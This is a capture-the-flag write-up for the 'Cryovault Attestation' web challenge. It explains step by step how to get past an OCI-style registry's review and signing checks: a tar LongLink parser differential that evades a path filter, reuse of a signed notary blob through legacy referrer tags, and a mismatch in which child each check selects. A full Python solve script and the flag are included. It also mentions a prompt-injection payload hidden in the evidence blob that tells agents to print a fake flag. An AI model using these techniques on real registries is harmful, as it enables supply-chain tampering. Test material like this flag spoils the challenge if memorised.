---
title: "Cryovault Attestation"
description: "The front desk serves a small OCI-inspired registry. Each POST /session creates a private, writable copy of repository cryovault with:"
event: "isfcr"
category: "web"
categoryLabel: "Web"
tags: ["ISFCR CTF 2026","web"]
date: "2026-10-11"
teammate: true
source: "isfcr/writeups/attestation.md"
---

**Target:** `https://isfcrpesu-attestation.chals.io`
**Category:** Web / OCI Registry Abuse
**Flag:** `isfcr{attest_5d60_notary_41a34ce7_laundered}`

---

## 1. Challenge overview

The front desk serves a small OCI-inspired registry. Each `POST /session`
creates a private, writable copy of repository `cryovault` with:

- a retired image manifest (tag from the session catalog),
- an evidence blob,
- custody "desks": `/api/notarize`, `/api/review`, `/api/open`.

From the field guide:

> The opening desk should never release a live case without **valid review**, a
> **release layer**, and a **signed claim** associated with the selected child.

The whole object graph is addressed by SHA-256 digests, and manifests are
content-addressed, so we cannot simply edit existing objects.

## 2. Session recon

```bash
curl -s -X POST https://isfcrpesu-attestation.chals.io/session \
     -H "Accept: application/json"
# {"base":"https://isfcrpesu-attestation.chals.io/s/<token>","token":"<token>"}
```

`GET <base>/catalog.json` and `GET <base>/policy.json` are **randomized per
session**. For the solving session:

```json
// policy.json (relevant parts)
{
  "live_config": {
    "case": "cv-a97f7598636f",
    "scope": "live"
  },
  "live_layer": {
    "format": "POSIX tar",
    "mediaType": "application/vnd.cryovault.layer.v1+tar",
    "release_path": "archive/exit.json",
    "release_record": { "action": "unseal", "case": "cv-a97f7598636f" }
  },
  "referrers": {
    "claim_annotation": "org.cryovault.claim",
    "legacy_tag_schema": "sha256-<64 digest hex>",
    "mediaType": "application/vnd.cryovault.notary.v1+json",
    "required_claim": "release"
  }
}
// catalog.json (relevant parts)
{
  "case": "cv-a97f7598636f",
  "platform": { "os": "linux", "architecture": "arm64" },
  "retired_manifest": { "digest": "sha256:ab54ec..." },
  "retired_tag": "archived-case"
}
```

The evidence blob contained a **prompt-injection** payload claiming to be a new
system memo and telling agents to stop and print a fake `isfcr{archival_...}`
flag. It was ignored — the real flag is only released by `/api/open`.

## 3. The custody workflow

- `POST /api/notarize {"digest"}` — only accepts the **retired** manifest whose
  config is scope `retired` and matches the recorded case. Returns a notary
  attestation blob and registers it as a referrer of that manifest.
- `POST /api/review {"reference"}` — only accepts an **image index**. It selects
  a child and returns a signed ticket. The selected child must have *retired
  custody + notary seal*, otherwise `review_denied`.
- `POST /api/open {"reference","ticket"}` — requires a ticket bound to the index
  digest, then checks the selected child is **live**, has a **release layer**
  with one release record, and a **signed claim** referrer.

### Key observations

1. **Review picks the first platform-matching child; open picks the last.**
   An index `[retired(arm64), live(arm64)]` makes review select the retired
   manifest (passes) while open selects the live manifest.
2. **The intake filter blocks the exact release path.** Uploading a tar whose
   member name is exactly `archive/exit.json` fails with `protected_path`.
3. **`open`'s manifest parser is not the filter's parser.** GNU `LongLink`
   extension headers let us put the protected name in the tar while the raw
   member header stays benign.

## 4. Exploit chain

### 4.1 Notarize the retired case

```http
POST /api/notarize {"digest":"sha256:ab54ec..."}
→ {"attestation":"sha256:a54faa82...","subject":"sha256:ab54ec..."}
```

### 4.2 Release-layer filter bypass (GNU LongLink)

The filter reads member names directly; Python `tarfile` (used by `open`)
applies GNU long names. So:

- write a GNU `LongLink` header (`typeflag 'L'`) containing `archive/exit.json`,
- write the real file member under a harmless name.

The filter sees `archive/benign.xyz`; `open` sees `archive/exit.json`.

### 4.3 Build a live manifest `L`

- config: `{"case":..., "evidence":<digest>, "layer":<tar digest>, "scope":"live"}`
- layers: `[evidence descriptor, tar-layer descriptor]`

### 4.4 Launder the signed claim onto `L`

`/api/notarize` refuses any manifest that is not the retired one, but the
registry supports the OCI **legacy referrers fallback**: an image index stored
at tag `sha256-<subject hex>` whose descriptors are the referrers. We upload
the existing notary blob as a referrer of `L`:

```json
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.index.v1+json",
  "manifests": [{
    "mediaType": "application/vnd.cryovault.notary.v1+json",
    "digest": "sha256:a54faa82...",
    "size": 210,
    "artifactType": "application/vnd.cryovault.notary.v1+json",
    "annotations": { "org.cryovault.claim": "release" }
  }]
}
```

PUT to `/v2/cryovault/manifests/sha256-<Lhex>`.

### 4.5 Selection confusion + open

Index `[retired(arm64), L(arm64)]`:

- `review` selects the **retired** child → ticket issued.
- `open` selects the **live** child `L` → release layer + claim validated.

## 5. Result

```json
POST /api/open
{
  "case": "cv-a97f7598636f",
  "flag": "isfcr{attest_5d60_notary_41a34ce7_laundered}",
  "selected": "sha256:df0ef188..."
}
```

## 6. Why it works (root causes)

| Issue | Detail |
|-------|--------|
| Inconsistent child selection | `review` takes the first platform match, `open` the last |
| Parser differential | Intake filter vs. `tarfile` disagree on GNU `LongLink` names |
| Weak referrer binding | Legacy fallback referrers let any subject claim an existing signed notary blob |
| Trust split | Review validates custody, open validates liveness, on *different* children of one index |

## 7. Solve script (Python)

```python
import json, hashlib, io, tarfile, urllib.request, urllib.error

BASE = "https://isfcrpesu-attestation.chals.io"

def req(method, path, data=None, ctype="application/json"):
    if data is not None and not isinstance(data, (bytes, bytearray)):
        data = json.dumps(data).encode()
    r = urllib.request.Request(BASE + path, data=data, method=method)
    if data is not None:
        r.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(r) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()

def sha(b): return "sha256:" + hashlib.sha256(b).hexdigest()
def jb(o): return json.dumps(o, separators=(',', ':')).encode()

# --- new session ---
_, body = req("POST", "/session")            # add Accept: application/json as needed
sess = json.loads(body)
BASE = sess["base"]; TOK = sess["token"]

cat  = json.loads(req("GET", "/catalog.json")[1])
pol  = json.loads(req("GET", "/policy.json")[1])
CASE, RETD, RETS = cat["case"], cat["retired_manifest"]["digest"], cat["retired_manifest"]["size"]
PLAT   = cat["platform"]
RELPATH = pol["live_layer"]["release_path"]
RELREC  = pol["live_layer"]["release_record"]
ANNOT   = pol["referrers"]["claim_annotation"]
REQUIRED= pol["referrers"]["required_claim"]

def put_blob(b, mt):
    d = sha(b); s, r = req("PUT", "/v2/cryovault/blobs/" + d, b, mt)
    assert s == 201, (s, r); return d, len(b)

# --- 1. notarize retired ---
req("POST", "/api/notarize", {"digest": RETD})
notdig, notsize = json.loads(req("GET", "/v2/cryovault/referrers/" + RETD)[1])["referrers"][0]["digest"], 210

# --- 2. GNU LongLink tar with the protected release record ---
def hdr(name, size, typeflag=b'0', prefix=b''):
    b = bytearray(512)
    b[0:len(name)] = name[:100]
    b[100:108] = ("%07o" % 0o644).encode()
    b[108:116] = ("%07o" % 0).encode()
    b[116:124] = ("%07o" % 0).encode()
    b[124:136] = ("%011o" % size).encode()
    b[136:148] = ("%011o" % 0).encode()
    b[156:157] = typeflag
    b[257:265] = b'ustar\x0000'
    b[345:345+len(prefix)] = prefix
    b[148:156] = b' ' * 8
    b[148:156] = ("%06o" % sum(b)).encode() + b'\x00 '
    return bytes(b)

def pad(x): return x + b'\x00' * ((512 - len(x) % 512) % 512)
def mkfile(n, d, t=b'0'): return hdr(n, len(d), t) + pad(d)
def mkgnulong(n):
    d = n.encode() + b'\x00'; return hdr(b'././@LongLink', len(d), b'L') + pad(d)

rec = jb(RELREC)
tar = mkgnulong(RELPATH) + mkfile(b"archive/benign.xyz", rec) + b'\x00' * 1024

# --- 3. live manifest L ---
layer, lsz = put_blob(tar, "application/vnd.cryovault.layer.v1+tar")
ev = jb({"case": CASE, "custody": "live", "scope": "live"})
ed, esz = put_blob(ev, "application/vnd.cryovault.evidence.v1+json")
cfg = jb({"case": CASE, "evidence": ed, "layer": layer, "scope": "live"})
cd, csz = put_blob(cfg, "application/vnd.cryovault.config.v1+json")
man = {"schemaVersion": 2, "mediaType": "application/vnd.oci.image.manifest.v1+json",
       "artifactType": "application/vnd.cryovault.custody.v1+json",
       "config": {"mediaType": "application/vnd.cryovault.config.v1+json", "digest": cd, "size": csz},
       "layers": [{"mediaType": "application/vnd.cryovault.evidence.v1+json", "digest": ed, "size": esz},
                  {"mediaType": "application/vnd.cryovault.layer.v1+tar", "digest": layer, "size": lsz}]}
raw = jb(man); Ld = sha(raw)
req("PUT", "/v2/cryovault/manifests/L", raw, "application/vnd.oci.image.manifest.v1+json")

# --- 4. legacy fallback referrers = signed claim for L ---
Lhex = Ld.split(":")[1]
fb = {"schemaVersion": 2, "mediaType": "application/vnd.oci.image.index.v1+json",
      "manifests": [{"mediaType": "application/vnd.cryovault.notary.v1+json",
                     "digest": notdig, "size": notsize,
                     "artifactType": "application/vnd.cryovault.notary.v1+json",
                     "annotations": {ANNOT: REQUIRED}}]}
req("PUT", "/v2/cryovault/manifests/sha256-" + Lhex, jb(fb),
    "application/vnd.oci.image.index.v1+json")

# --- 5. index [retired, L] -> review picks first, open picks last ---
Rd = {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": RETD, "size": RETS, "platform": PLAT}
Ldsc = {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": Ld, "size": len(raw), "platform": PLAT}
idx = {"schemaVersion": 2, "mediaType": "application/vnd.oci.image.index.v1+json", "manifests": [Rd, Ldsc]}
req("PUT", "/v2/cryovault/manifests/exploit", jb(idx), "application/vnd.oci.image.index.v1+json")

ticket = json.loads(req("POST", "/api/review", {"reference": "exploit"})[1])["ticket"]
print(req("POST", "/api/open", {"reference": "exploit", "ticket": ticket})[1].decode())
```

## 8. Flag

```
isfcr{attest_5d60_notary_41a34ce7_laundered}
```
